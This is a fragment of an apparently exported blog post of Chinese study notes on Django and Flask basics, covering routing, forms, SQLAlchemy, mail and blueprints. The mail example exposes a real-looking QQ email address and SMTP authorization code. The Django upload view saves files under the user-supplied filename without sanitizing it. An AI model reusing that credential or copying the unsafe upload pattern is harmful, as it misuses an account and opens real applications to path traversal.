在static文件夹中新建一个media文件夹，用于保存用户的头像等\n    在setting中设置MEDIA_ROOT &#x3D; 拼接文件夹,MEDIA_URL &#x3D; &#39;&#x2F;media&#x2F;&#39;\n\n    后台管理界面上传图片:创建一个数据库模型，定义一个字段，类型为ImageField(upload_to &#x3D; &#39;media中的某个文件夹&#39;)\n\n浏览器上传的照片:\n    表单的提交方式和编码方式必须如下\n    &lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;&#x2F;upload_down&quot;&gt;\n        &#96;&#123;% csrf_token %&#125;&#96;\n        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;pic&quot;&gt;&lt;br&#x2F;&gt;\n        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot;&gt;\n    &lt;&#x2F;form&gt;\n        读取照片页面信息并保存：\n    def upload(request):\n        return render(request, &#39;upload.html&#39;)\n\n\n    def upload_down(request):\n        pic &#x3D; request.FILES[&#39;pic&#39;]\n        pic_path &#x3D; f&#39;&#123;settings.MEDIA_ROOT&#125;&#x2F;user_admin&#x2F;&#123;pic.name&#125;&#39;\n        with open(pic_path, &#39;wb&#39;) as pf:\n        for content in pic.chunks():\n            pf.write(content)\n        PicInfo.objects.create(pic_super&#x3D;f&#39;user_admin&#123;pic.name&#125;&#39;)\n        return HttpResponse(&#39;ok&#39;)\n浏览器上传的图片：\n    pic &#x3D; request.FILES[&#39;xx&#39;]的对象：pic.name获取文件名,pic.chunks()分块读取内容进行保存，pic.size获取上传文件的大小都是常用的\n\n\n\n分页（ 在view.py中和html代码中使用）:\n    需要包：from django.core.paginator import Paginator\n    Paginator属性:num_pages:返回分页的总页数,page_range:返回分页的页码列表\n    Paginator方法:page(self,number)：返回低number页的Page实例对象\n    Page的属性:number:返回当前页的页码，object_list：返回包含当前页的数据的查询集，paginator:返回对应的Paginator对象\n    page的方法:has_previous:判断是否有前一页,has_next:判断是否有下一页,previous_page_number:放回前一页,next_page_unmber:返回下一页\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"第五模块-url匹配\"><a href=\"#第五模块-url匹配\" class=\"headerlink\" title=\"第五模块(url匹配)\"></a>第五模块(url匹配)</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">可以用path，url\nfrom django.urls import path,include或者from django.conf.urls import url,include\n在project的urls.py中，使用反向解析用到include,在include中添加参数namespace空间命名，可以进行反向解析，在应用中的urls.py中的urlpatterns上面添加一句app_name&#x3D;&#39;xx&#39;这个名字和namespace的名字相同。\n在应用的urls.py中，想使用反向解析，不需要include,可以直接在最后添加参数，name&#x3D;&#39;xx&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n<h2 id=\"数据加密\"><a href=\"#数据加密\" class=\"headerlink\" title=\"数据加密\"></a>数据加密</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install itsdangerous\nfrom itsdangerous import TimedJSONWebSignatureSerializer\n创建一个TimedJSONWebSignatureSerializer对象: xx &#x3D; TimedJSONWebSignatureSerializer(&#39;加密秘钥&#39;，过期时间)\n\n加密：加密结果 &#x3D; TimedJSONWebSignatureSerializer对象.dumps(数据)\n解密: 解密结果 &#x3D; TimedJSONWebSignatureSerializer对象.loads(加密结果)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"异步发邮件\"><a href=\"#异步发邮件\" class=\"headerlink\" title=\"异步发邮件\"></a>异步发邮件</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">pip install celery\n项目中新建一个任务包，在这个包中使用celery（from celery import Celery）\n创建Celery的实例对象：xx &#x3D; Celery(&#39;名字&#39;，broker&#x3D;&#39;redis:&#x2F;&#x2F;127.0.0.1:6379&#x2F;1&#39;),broker代表中间人\n定义需要异步处理的函数，用@xx.task装饰\n在需要用到异步处理的应用中使用：\n    导入过来的函数.delay(参数)\n再将整个项目复制一份，进入复制的项目中的celery的包中：\n    import os\n    os.environ.setdefault(&#39;DJANGO_SETTINGS_MODULE&#39;, &#39;dalifresh.settings&#39;)\n    django.setup()\n然后再终端输入命令:celery -A 取好的名字 worker -l info来运行这个异步处理<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"Flask基础","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T08:04:52.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"flask学习笔记","_content":"# Flask\n## `__name__`对象说明\n\n`__name__`返回的就是当前的模块名字\n\n`__name__`如果在本文件中使用的话，那么就是`__main__`\n\n`__name__`如果本文件被导入到别的文件中使用的话，那么就是模块的名字\n在文件中，被调用的时候，永远不可能等于`__main__`\n\n\n\n## Flask\n创建Flask对象: 名字 = Flask(一个魔法值(以这个为根目录)),括号里面的参数，就表示以这个参数所在的模块为根目录，默认这个目录中的static为静态目录，templates为模板目录\n\n创建视图: 等于创建一个函数，要显示给浏览器的数据，直接return\n\n路径配置: 给视图函数加装饰器,格式: app.route('路径')\n\n运行flask: app.run(),flask的参数:\n```python\n app = Flask(__name__,  # 创建flask的应用对象，__name__返回的就是当前的模块名字,表示以什么为根目录\n    static_url_path='/python',  # 访问静态的url前缀，不设置的话默认值是static\n    static_folder='static',  # 静态文件的目录，默认就是static\n    template_folder='templates',  # 模板文件的目录，默认的是templates\n    )\n```\n### flask的配置\n >   flask没有Django那种的专门的配置文件，但是可以通过以下的三种方式来配置\n > -   1、使用配置文件:\n     -   1、创建一个配置文件xxx.cfg\n     -  2、app.config.from_pyfile(文件的路径)\n> -    2、使用配置对象:\n     -   1、创建一个类，将配置写入\n     -   2、app.config.from_object(类名)\n> -    3、直接配置\n    -    app.config['DEBUG'] = True\n     -   app.config.update(key=v1,k2=v2):一次性配置多个，如果已经存在，那么表示更新\n\n### 获取配置中的参数\n>    在flask中，配置中除了可以存储flask的配置，也可以存储开发者放的一些数据\n > -   获取方式一: app.config.get('key')\n> -    获取方式二: current_app.config.get('key'),这是一个模块，也在flask模块中导入，current_app等价于app,有的时候我们拿不到app，所以这个模块可以替代\n\n### app.run()的使用\n >   app.run(host='x.x.x.x', port=xxx, debug=True(False)) ,app.run(host='0.0.0.0', port=xxx)是万能的\n\n### 查看路由表\n>  和Django相比，Flask没有一个直观的路由表，而Django却有urls.py文件可以查看路由表\n>  \n >   Flask查看路由表: app.url_map，这个方法就可以查看flask的路由表，默认的有static的路由记录，还可以查看请求方式\n >   \n  >  如果某些视图只能用某些请求方式来访问，那么方法就是:@app.route('路径', methods=[请求方式列表])\n  >  \n >   当有多个视图对应同一个url地址的时候，解决方法是：要么修改url,要么修改请求方式\n >   \n >   当有多个url地址对应一个视图函数的时候(给视图函数多装几个装饰器)，那么就是说这多个url都可以访问这个视图\n >   \n >   重定向:从flask中导入redirect模块，就可以实现重定向(跳转，两次请求，重定向状态码302),用法:return redirect(url地址)\n >   \n >   反向解析: 从flask中导入url_for模块,就可以实现反向解析，用法: url = url_for('视图函数的名字', 参数列表)\n\n#### url带参数\n```text\n@app.route('/路径/<转换器类型:参数名>'):\n    已经实现的转换器类型: int , float , path,如:@app.route('/index/<int:id>'),在访问的时候:127.0.0.1:5000://index/123就可以访问.\n    不加转换器类型就是表示匹配普通的字符串（除了/）:@app.route('/路径/<参数名>')\n    int转换器类型，匹配整数\n    float转换器类型，匹配小数\n    path转换器类型，匹配字符串，但是包括/\n        @app.route('/goods/<int:id>')\n        def goods_detail(id):\n                '''定义商品视图函数'''\n            return f'goods detail page{id}'\n\n    自定义转换器(三步):\n        1、定义自己的转换器:\n            导入from werkzeug.routing import BaseConverter。\n            定义一个转换器类，使其继承BaseConverter.\n        2、将自定义的转换器添加到flask的应用中:\n            app.url_map.converters['转换器名'] = 类名\n        3、使用:\n            @app.route('/路径/<转换器类型:参数名>')\n```\n### 定义万能转换器\n```text\n说明一点:转换器也可以跟参数（re）: @app.route('/路径/<转换器类型(参数):参数名>')\n方式一、\n    class ReConverter(BaseConverter):\n        '''\n            re万能转换器\n            创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n            在视图函数使用的时候，可以跟参数，一个正则\n            工作原理:\n                在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n        '''\n        # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n        def __init__(self, url_map, regex):\n            super().__init__(url_map)\n            # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n            # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n            self.regex = regex\n    # 加到应用中\n    app.url_map.converters['re'] = ReConverter\n    @app.route(\"/goods/<re(r'1[34578]\\d{9}'):id>\")\n    def goods_detail(id):\n        '''定义商品视图函数'''\n        return f'goods detail page{id}'\n方式二、\n    class ReConverter(BaseConverter):\n        '''\n            re万能转换器\n            创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n            在视图函数使用的时候，可以跟参数，一个正则\n            工作原理:\n                在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n        '''\n        # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n        def __init__(self, url_map):\n            super().__init__(url_map)\n            # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n            # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n            self.regex = r'1[34578]\\d{9}'\n    # 加到应用中\n    app.url_map.converters['re'] = ReConverter\n    @app.route(\"/goods/<re:id>\")\n    def goods_detail(id):\n        '''定义商品视图函数'''\n        return f'goods detail page{id}'\n```\n\n### 高级的转换器应用\n```text\nclass ReConverter(BaseConverter):\n    '''\n        re万能转换器\n        创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n        在视图函数使用的时候，可以跟参数，一个正则\n        工作原理:\n            在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n    '''\n\n    # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n    def __init__(self, url_map):\n        super().__init__(url_map)\n        # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n        # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n        self.regex = r'1[34578]\\d{9}'\n\n    '''\n        to_python和to_url都是父类中的方法:\n            to_python:在匹配成功以后，请求网址带来的参数会交给to_python做出处理，返回的结果为视图函数的参数\n            to_url:在使用重定向(url_for)的时候使用，url(\"视图名\",参数)\n            使用重定向的时候，被定向的视图函数如果有参数需要匹配，那么，在重定向的时候，在使用url_for()的时候，就会去匹配一次被定向视图使用的转换器，在匹配成功的同时调用to_url方法\n            在to_url中处理以后，会交给to_python处理\n\n    '''\n\n    def to_python(self, value):\n        return value\n\n    def to_url(self, value):\n        return '13443218888'\n\n\n# 加到应用中\napp.url_map.converters['re'] = ReConverter\n\n\n@app.route(\"/goods/<re:id>\")\ndef goods_detail(id):\n    '''定义商品视图函数'''\n    return f'goods detail page{id}'\n\n\n@app.route(\"/index\")\ndef index():\n    url = url_for(\"goods_detail\", id=13412344321)\n    return redirect(url)\n```\n\n## Request对象\n```text\n从flask中导入request和Response\nrequest中常用的属性:\n    data:获取请求的数据，并转换为字符串，request.data\n    form:获取请求中的表单数据,request.form.get()，获取一对一,request.form.getlist()，获取一对多的数据\n    args:获取url中的参数(http:x.x.x.x:xxx/xxx?city=chengdu)，\n    cookies:获取到cookie，request.cookies.get()\n    headers:获取请求头中的报文:request.headers\n    method:获取请求方式:request.method\n    url:获取请求的url:request.url\n    files:获取上传的文件:  if request.method == 'POST':\n                            file = request.files.get('pic')\n                            file.save(f'./img/{file.filename}')\n    path: 拿到浏览器请求的地址（视图）\n```\n\n### abort\n```\n从flask中导入abort\n无条件终止视图函数的执行，并返回给前端特定的信息\n用法一、\n    abort（状态码）\n用法二、\n    re = Response(\"login defete\")\n    abort(re)\n```\n### 自定义错误信息\n```\n用户访问的页面不错在的时候，定义一个独立的视图,用@app.errorheader(404)来装饰\n固定写法:\n    @app.errorhandler(404)\n    def header_error(err):\n         return '没有'\n```\n### 设置响应信息的方法\n```\n从flask中导入make_response\n方法一:\n    使用:\n    rsp = make_response(显示的字符串)\n    rsp.status = '999 lqs'  状态码\n    rsp.headers['lqs'] = 'lqs'   头信息\n    return rsp\n方法二:\n    return 显示字符串, 状态码, 头信息\n ```\n#### json\n```\n方法一、import json\n    dic = {\"name\": \"lqs\", \"age\": 12}\n    json_str = json.dumps(dic)\n    print(type(json_str))\n    print(json_str)\n    dic_str = json.loads(json_str)\n    print(type(dic_str))\n    print(dic_str)\njson.dumps():字典转json字符串\njson.loads():json字符串转字典\n\n方法二、从flask中导入jsonify\n    return jsonify(dic) ：将字典转成json字符串，并且自动设置头信息\n```\n### cookie的读写\n```\n读写和django一样，都是通过response写入，通过request读取\n在有关cookie的操作中，都要 app.config[\"SECRET_KEY\"] = xxxxxx\n    导入:from flask import make_response\n    实例化:resp = make_response(显示字符串)\n    设置:resp.set_cookie(\"lqs\", \"Flask\", max_age=3600)\n    读取:request.cookies.get('lqs')\n    删除:resp.delete_cookie('lqs')\n```\n\n### session的读写\n```\n导入: from flask import session\n设置: session[key] = value\n读取: session.get(key)\n```\n\n### 钩子\n```\n类似于django中的中间件\n在请求的时候使用，不是任何请求都会调用，是调用到视图函数的时候，在之前或者之后进行操作\n@app.before_first_request : 第一次请求之前调用\n@app.before_request : 每次请求之前调用\n@app.after_request : 每次请求之后调用（视图函数没有出错的情况）\n@app.teardown_request : 每次请求之后调用（不论是否出错都会调用）\n\n@app.after_request : 对应的视图函数必须带一个参数，用来接收视图函数的返回值，也就是接收在页面上现实的东西\n@app.teardown_request : 对应的视图函数必须带一个参数，用来接收视图函数的返回值，也就是接收在页面上现实的东西\n```\n### g对象\n```\nfrom flask import g\ng对象中保存的数据，在一次请求中的，多个函数中可以使用\n使用:\n    g.key = value:存\n    xx = g.key:取\n```\n### flask_script扩展(实现shell代码),这样子可以和django一样，runserver\n```\npip install Flask-Script\nfrom flask_script import Manager\nmanager = Manager(flask应用名)\nmanager.run()\n```\n### flask使用模板文件\n```\nfrom flask import render_template\nreturn render_template(\"html模板\", key=value, key=value)  或者    return render_template(\"html模板\", **字典名（组织之后的上下文）)\n在html模板文件中，可以使用过滤器:使用方法:{{value | 过滤器}}如safe就表示转义\n```\n### flask中html模板转义\n```\n使用方法: {{ 处理对象 | 过滤器 }}\n常用过滤器:\n    safe : 禁用转义\n    capitalize : 变量值的首字母转换成大写其余小写\n    lower : 全部转换为小写\n    upper : 全部转换为大写\n    title : 每个单词首字母大写\n    trim  : 去除首尾空格\n    reverse : 字符串反转\n    format : 格式化输出\n    striptags : 渲染之前把所有的html标签去掉\n    first : 取出列表中的第一个元素\n    last : 取出列表中的最后一个元素\n    length : 获取列表的长度\n    sum : 列表数据求和\n    sort : 列表排序\n自定义过滤器:\n    在flask代码中定义\n    第一种方式(函数):\n        定义一个过滤器函数\n        返回值就是过滤后的数据\n        app.add_template_filter(函数名, 过滤器名)就可以注册这个过滤器\n        然后在html模板中使用\n    第二种方式(装饰器:\n        定义一个过滤器函数\n        返回值就是过滤后的数据\n        加装饰器:@app.template_filter(过滤器名)\n        然后在html模板中使用\n\n```\n### flask使用Flask-WTF\n```\n可以在服务器端(创建表单模型)校验表单数据，可以设置csrf攻击的关闭\npip install Flask-WTF\nfrom flask_wtf import FlaskForm : 这个模块让类继承之后就可以实现创建表单模型\nfrom wtforms import StringField, PasswordField, SubmitField : 这个wtforms模块中的方法都是关于表单中的各个控件的类型，这里没有写全面\nfrom wtforms.validators import DataRequired, EqualTo : wtforms下面的validators模块中的方法就是一些校验规则\n\n说明: 在flask中定义的表单模型作用有两个,首先，第一个作用就是不用用户再去自己打表单，可以将表单模型传到模板中生成表单，第二个作用就是验证数据，两个作用是区分开的\n\n定义表单模型类:\n    class LoginForm(FlaskForm):\n    '''\n        自定义的注册表单抽象类\n            label标签表示设置名称,用中文就使用u\"xx\"\n            validators表示验证数据，是一个列表类型\n            DataRequired表示必须输入，有一个参数，表示验证失败的时候显示文本\n            EqualTo表示和谁一样，有连个参数，第一个填写和谁一样，第二个填写验证失败的显示文本\n    '''\n        user_name = StringField(label=u\"用户名\", validators=[DataRequired(\"用户名不能为空\")])\n        password = PasswordField(label=r\"密码\", validators=[DataRequired(\"密码不能为空\")])\n        password2 = PasswordField(label=r\"确认密码\", validators=[DataRequired(\"确认密码不能为空\"), EqualTo(\"password\", \"两次密码不一致\")])\n        submit = SubmitField(label=u\"提交\")\n\n\n        @app.route(\"/login\", methods=[\"POST\", \"GET\"])\n        def login():\n            '''创建表单对象'''\n            form = LoginForm()\n            # 判断form中的数据是否合理\n            # 如果form中的数据完全满足验证，则返回真，否则返回假\n            if form.validate_on_submit():\n                uname = form.user_name.data\n                pwd = form.password.data\n                pwd2 = form.password2.data\n                print(uname, pwd, pwd2)\n                session[\"username\"] = uname\n                url = url_for(\"index\")\n                return redirect(url)\n            return render_template(\"login.html\", form=form)\n\n\n在html模板中生成表单:\n     <form  method=\"post\">\n        {{ form.csrf_token}}\n        {{ form.user_name.label }} {{ form.user_name }}<br>\n        {% for msg in form.user_name.errors %}\n        <p>{{ msg }}</p>\n        {% endfor %}\n\n        {{ form.password.label }} {{ form.password }}<br>\n        {% for msg in form.password.errors %}\n        <p>{{ msg }}</p>\n        {% endfor %}\n\n        {{ form.password2.label }} {{ form.password2 }}<br>\n        {% for msg in form.password2.errors %}\n        <p>{{ msg }}</p>\n        {% endfor %}\n\n        <p>{{ form.submit }}</p>\n\n     </form>\n\n```\n### 宏的定义和使用\n```\n在同一个html中定义和使用:\n    没有参数:\n        定义:\n        {% macro input() %}\n         <input type=\"text\" name=\"\" value=\"\" size=\"30\">\n        {% endmacro %}\n        使用:\n        {{ input() }}\n    有参数:\n    定义:\n    {% macro input(type,name,size) %}\n     <input type={{type}} name={{name}} value=\"\" size={{size}}>\n    {% endmacro %}\n    使用:\n    {{ input('text', 'username', 40) }}\n\n在不同html中定义和使用:\n    没有参数:\n        定义在macro2.html中:\n        {% macro input() %}\n         <input type=\"text\" name=\"\" value=\"\" size=\"30\">\n        {% endmacro %}\n        在macro。html使用:\n        {% import \"macro2.html\" as 别名 %}\n        {{ 别名.input() }}\n\n```\n### 模板继承\n```\n和django中的模板继承一样: {% extend \"模板名\" %}  使用 {% block xx %} {% endblock xx %}\n```\n\n### flask中一些特殊的方法\n```\n有些方法和变量不需要传递也可以在模板中直接使用\nconfig中的方法\nrequest中的方法\nurl_for中的方法\n模板的闪现:\n    闪现就是表示有的信息，只是出现一次\n    在flask中:from flask import flash\n            在视图中使用flash(xxx)来添加信息，可以添加很多条\n    在模板中:\n        {% for x in get_flashed_messages() %}\n        {{ x }}\n        {% endfor %}\n```\n### flask链接数据库\n```\npip install flask-sqlalchemy  模型类到sql语句的转换，再将结果转换为模型类对象\npip install flask-mysqldb   数据库驱动\nfrom flask_sqlalchemy import SQLAlchemy  可以创建数据库对象\n配置:\n    app.config['SQLALCHEMY_DATABASE_URI'] = \"mysql://root:123456@127.0.0.1:3306/msfood\"\n    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True   # 配置跟踪,数据库和模型类同步\n创建数据库sqlalchemy工具对象,就可以使用数据库了\n    db = SQLAlchemy(app)\n\n\n创建模型类\nclass Role(db.Model):\n    '''身份表'''\n    __tablename__ = \"tbl_roles\"  # 指明表名\n    id = db.Column(db.Integer, primary_key=True)\n    name = db.Column(db.String(32), unique=True)\n    users = db.relationship(\"User\", backref=\"role\")\n     def __repr__(self):\n        '''补充方法,可以让显示对象的时候更直观,类似于__str__方法'''\n        return f'{self.users}'\nclass User(db.Model):\n    '''用户表'''\n    __tablename__ = \"tbl_users\"  # 指明数据库的表名\n    id = db.Column(db.Integer, primary_key=True)  # 主键，自动递增\n    name = db.Column(db.String(64), unique=True)\n    email = db.Column(db.String(128), unique=True)\n    password = db.Column(db.String(128))\n    role_id = db.Column(db.Integer, db.ForeignKey(\"tbl_roles.id\"))\n\n生成数据表:\n    *第一次生成的时候清除所有数据:\n         db.drop_all()\n    创建所有表\n        db.create_all()\n\n说明:\n    创建表的时候，和底层相关，只要是表中的一行，都是有关底层的，用的都是真实的表的名字\n    users = db.relationship(\"User\", backref=\"role\"): 这个语句就是表示和底层无关，只和flask中的对象有关，User就是一个模型对象\n        users表和roles表是有关联的（外键）,那么db.relationship就可以让两个表相互拿东西，表示从User模型类中拿出和Role模型有关联的数据\n        backref表示没有定义relationship的对方表中，也可以反推拿出和User模型有关的Role模型的数据\n        使用方法:\n            在Role模型:role.users\n            在user模型中:user.role\n\n添加数据:\n    创建对象:xx = 模型(属性=值，属性=值)\n    session记录对象任务:db.session.add(xx),添加一条数据，db.session.add_all(),添加多条数据\n    提交任务到数据库:db.session.commit()\n```\n### sqlalchemy查询\n```\n用模型类来查询\n模型类.query.all():查询所有数据，返回的是一个列表，可以取出某一个对象，然后读取属性值\n模型类.query.first():返回第一条记录\n模型类.query.get(主键的id):根据主键id获取对象\n模型类.query.filter_by(字段=xx,字段==xx).all():获取满足条件的所有数据,条件是与\n模型类.query.filter(模型类.字段==xx,模型类.字段==xx).all():拿出满足条件的所有数据，条件是与\n模型类.query.filter(or_(模型类.字段==xx,模型类.字段.endswith(xxx))).all():拿出满足条件的所有数据，条件是或，使用或必须导入from sqlalchemy import or_\n模型类.query.filter(条件).offset(2).limit(3).order_by(模型类.字段.desc()).all():返回满足条件并且忽略前两条数据，取出三条数据然后降序排列的数据，每一个部分都可以单独使用\ndb.session.query(模型类.字段, func.count(模型类.字段)).group_by(模型类.字段).all():分组查询，from sqlalchemy import func,func.聚合函数(属性),就可以查出来\n```\n\n#### sqlalchemy修改\n```\n模型类.query.filter(条件).update({字段名:值,字段名:值,字段名:值})\ndb.session.commit()\n```\n#### sqlalchemy删除\n```\n xx = 模型类.query.get(x)\n db.session.delete(xx)\n db.session.commit()\n```\n\n#### flask中和django一样使用迁移的方式\n```\npip install flask-migrate\nfrom flask_script import Manager\nfrom flask_migrate import Migrate, MigrateCommand\n\ndb = SQLAlchemy(app)\n\n创建flask脚本管理工具\nmanager = Manager(app)\n创建数据库迁移工具对象\nMigrate(app, db)\n向manager对象中添加数据的操作命令\nmanager.add_command(\"操作的名字\", MigrateCommand)\n\nmain中:\n    manager.run()\n终端中:\n    python3 xxx.py 操作的名字 init  : 让他初始化一下，自动创文件夹\n    python3 xxx.py 操作的名字 migrate -m \"版本说明信息\" : 生成迁移文件（版本说明可以不要），同价与django中的makemigrations\n    多次migrate之后需要更新数据库:python3 xxx.py 操作的名字 upgrade，可以升级同步\n    python3 xxx.py 操作的名字 history : 查看历史修改\n    python3 xxx.py 操作的名字 downgrade 版本编号 : 版本回退\n\n```\n\n### flask发送邮件\n```\npip install flask-mail\nfrom flask_mail import Mail, Message\napp = Flask(__name__)\n\napp.config.update(\n    DEBUG=True,\n    MAIL_SERVER='smtp.qq.com',\n    MAIL_PROT=465,\n    MAIL_USE_TLS=True,\n    MAIL_USERNAME='749062870@qq.com',\n    MAIL_PASSWORD='kttumcufpqasbcii',\n)\n\n # sender发送方,recipients接收方列表\n    mail = Mail() : 创建mail对象\n    mail.init_app(app) : 初始化mail对象\n    msg = Message(\"傻逼\", sender=\"749062870@qq.com\", recipients=[\"2807175480@qq.com\"]) : 设置邮件消息的邮件头\n    msg.body = \"傻逼\"  : 设置邮件的正文\n    mail.send(msg) : 发送邮件\n```\n### 蓝图（Blueprint）\n```\n之前写的都在一个py文件中\n蓝图就是分割各个块\n将视图写在其他的py文件中，那么不用再给写在外面的视图加装饰器，可以在有app的py文件中导入，然后通过app.route(\"路径\")(视图函数)\n\n蓝图的正解:\n    '''\n        蓝图和django中的各个应用差不多,一个蓝图自成一块，在主窗口中注册进app里面就可以使用\n        使用方法:\n            创建一个应用目录，再添加一个__init__.py让这个目录成为一个可以调动的包，再__init__.py中定义好蓝图,再到视图中导入这个蓝图，就可以使用，最后再视图使用之后，再到__init__.py中\n            导入视图中使用了蓝图的视图函数。\n            蓝图再使用模板文件和静态文件的时候，和主app不同，主app有默认的配置，而蓝图中没有，需要再定义蓝图的时候手动设置，和主app的设置方法是一样的\n            蓝图在没有定义静态文件目录和模板文件目录的时候，默认是使用主app的，就算配置可静态目录和模板目录，蓝图也是先去主app的静态目录和模板目录查找，没有找到在回到自己的里面去找，这个时候，就是主app的优先级大于蓝图\n            在视图中使用蓝图:\n                1、在__init__.py中from flask import Blueprint\n                2、在__init__.py中定义蓝图,xx = Blueprint(\"蓝图名\",__name__)\n                3、导入蓝图\n                4、用蓝图装饰，和主app装饰视图一摸一样的\n                5、在__init__.py中导入使用了蓝图的视图函数（导入到蓝图之下）\n                6、在主app的文件中注册蓝图:app.register_blueprint(蓝图, url_prefix=\"/lqs\")，url_prefix表示前缀\n    '''\n```\n### 单元测试\n```\n在flask中使用单元测试的时候，千万不要动源代码，重新写个测试文件\nimport unittest\n导入要测试的flask代码文件\n创建测试类，继承unittest.TestCase\n定义好测试函数\nimport unittest\nimport json\nfrom flaskDay14 import Test\n\nclass Index(unittest.TestCase):\n    def setUp(self):\n        # 设置flask工作在测试模式下，在测试出错的时候会给出具体错误行\n        Test.app.testing = True\n        # 模拟flask客户端,setUp中的代码会在所有函数之前调用\n        self.client = Test.app.test_client()\n    def test_index(self):\n        # 模拟请求返回数据\n        ret = self.client.post(\"/index\", data={\"username\":\"lqs\", \"password\":\"lqs\"})\n        # 拿到数据\n        resp = ret.data\n        # 装成字典\n        resp = json.loads(resp)\n        # 断言\n        self.assertIn(\"code\", resp)\n        self.assertEqual(resp[\"code\"], 2)\n\n\nif __name__ == '__main__':\n    # 测试\n    unittest.main()\n\n对所有的测试都可以使用\n```","source":"_posts/Flask基础.md","raw":"---\ntitle: Flask基础\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 16:04:52\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: flask学习笔记\ntags: flask\ncategories: Python\n---\n# Flask\n## `__name__`对象说明\n\n`__name__`返回的就是当前的模块名字\n\n`__name__`如果在本文件中使用的话，那么就是`__main__`\n\n`__name__`如果本文件被导入到别的文件中使用的话，那么就是模块的名字\n在文件中，被调用的时候，永远不可能等于`__main__`\n\n\n\n## Flask\n创建Flask对象: 名字 = Flask(一个魔法值(以这个为根目录)),括号里面的参数，就表示以这个参数所在的模块为根目录，默认这个目录中的static为静态目录，templates为模板目录\n\n创建视图: 等于创建一个函数，要显示给浏览器的数据，直接return\n\n路径配置: 给视图函数加装饰器,格式: app.route('路径')\n\n运行flask: app.run(),flask的参数:\n```python\n app = Flask(__name__,  # 创建flask的应用对象，__name__返回的就是当前的模块名字,表示以什么为根目录\n    static_url_path='/python',  # 访问静态的url前缀，不设置的话默认值是static\n    static_folder='static',  # 静态文件的目录，默认就是static\n    template_folder='templates',  # 模板文件的目录，默认的是templates\n    )\n```\n### flask的配置\n >   flask没有Django那种的专门的配置文件，但是可以通过以下的三种方式来配置\n > -   1、使用配置文件:\n     -   1、创建一个配置文件xxx.cfg\n     -  2、app.config.from_pyfile(文件的路径)\n> -    2、使用配置对象:\n     -   1、创建一个类，将配置写入\n     -   2、app.config.from_object(类名)\n> -    3、直接配置\n    -    app.config['DEBUG'] = True\n     -   app.config.update(key=v1,k2=v2):一次性配置多个，如果已经存在，那么表示更新\n\n### 获取配置中的参数\n>    在flask中，配置中除了可以存储flask的配置，也可以存储开发者放的一些数据\n > -   获取方式一: app.config.get('key')\n> -    获取方式二: current_app.config.get('key'),这是一个模块，也在flask模块中导入，current_app等价于app,有的时候我们拿不到app，所以这个模块可以替代\n\n### app.run()的使用\n >   app.run(host='x.x.x.x', port=xxx, debug=True(False)) ,app.run(host='0.0.0.0', port=xxx)是万能的\n\n### 查看路由表\n>  和Django相比，Flask没有一个直观的路由表，而Django却有urls.py文件可以查看路由表\n>  \n >   Flask查看路由表: app.url_map，这个方法就可以查看flask的路由表，默认的有static的路由记录，还可以查看请求方式\n >   \n  >  如果某些视图只能用某些请求方式来访问，那么方法就是:@app.route('路径', methods=[请求方式列表])\n  >  \n >   当有多个视图对应同一个url地址的时候，解决方法是：要么修改url,要么修改请求方式\n >   \n >   当有多个url地址对应一个视图函数的时候(给视图函数多装几个装饰器)，那么就是说这多个url都可以访问这个视图\n >   \n >   重定向:从flask中导入redirect模块，就可以实现重定向(跳转，两次请求，重定向状态码302),用法:return redirect(url地址)\n >   \n >   反向解析: 从flask中导入url_for模块,就可以实现反向解析，用法: url = url_for('视图函数的名字', 参数列表)\n\n#### url带参数\n```text\n@app.route('/路径/<转换器类型:参数名>'):\n    已经实现的转换器类型: int , float , path,如:@app.route('/index/<int:id>'),在访问的时候:127.0.0.1:5000://index/123就可以访问.\n    不加转换器类型就是表示匹配普通的字符串（除了/）:@app.route('/路径/<参数名>')\n    